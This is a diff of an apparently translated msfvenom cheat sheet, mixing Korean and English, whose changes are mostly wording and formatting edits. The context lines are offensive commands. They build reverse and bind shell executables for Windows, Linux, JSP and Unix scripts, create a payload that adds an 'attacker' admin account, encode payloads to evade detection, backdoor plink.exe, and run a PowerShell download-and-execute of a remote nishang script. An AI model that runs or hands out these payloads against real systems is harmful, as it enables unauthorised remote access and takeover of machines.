@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에서 경험이 풍부한 해커 및 버그 바운티 헌터와 소통하세요!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
 **Hacking Insights**\
 해킹의 스릴과 도전에 대해 깊이 있는 콘텐츠에 참여하세요.
@@ -26,7 +26,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에�
 실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계의 최신 정보를 유지하세요.
 
 **Latest Announcements**\
-새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 유지하세요.
+새로운 버그 바운티와 중요한 플랫폼 업데이트에 대한 최신 정보를 유지하세요.
 
 **Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
@@ -36,7 +36,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에�
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
+`-a`를 사용하여 아키텍처를 지정하거나 `--platform`을 사용할 수 있습니다.
 
 ## Listing
 ```bash
@@ -51,7 +51,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-## **Windows**
+## **윈도우**
 
 ### **리버스 셸**
 
@@ -59,7 +59,9 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-### Bind Shell
+{% endcode %}
+
+### 바인드 셸
 
 {% code overflow="wrap" %}
 ```bash
@@ -75,9 +77,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **명령 실행** 
-
-{% code overflow="wrap" %}
+### **명령 실행**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -96,6 +96,8 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
+{% endcode %}
+
 ## 리눅스 페이로드
 
 ### 리버스 셸
@@ -105,6 +107,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
+{% endcode %}
+
 ### 바인드 셸
 
 {% code overflow="wrap" %}
@@ -167,6 +171,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
+{% endcode %}
+
 ### WAR
 
 #### 리버스 셸
@@ -197,9 +203,7 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-### **배쉬**
-
-{% code overflow="wrap" %}
+### **Bash**
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
@@ -215,7 +219,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 **실시간 해킹 뉴스**\
 실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계의 최신 정보를 유지하세요.
 
-**최신 발표**\
+**최신 공지사항**\
 새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 유지하세요.
 
 오늘 [**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!
